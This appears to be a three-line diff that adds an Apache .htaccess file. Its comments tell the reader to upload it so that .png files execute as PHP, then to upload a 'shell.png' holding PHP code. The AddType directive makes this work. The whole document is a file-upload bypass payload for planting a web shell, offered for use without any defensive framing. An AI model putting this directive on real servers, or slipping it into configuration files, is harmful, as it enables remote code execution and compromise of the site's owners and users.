@@ -1,0 +1,3 @@
+# Upload this as ".htaccess" (Apache with AllowOverride) to make .png files execute as PHP,
+# then upload shell.png containing PHP code.
+AddType application/x-httpd-php .png
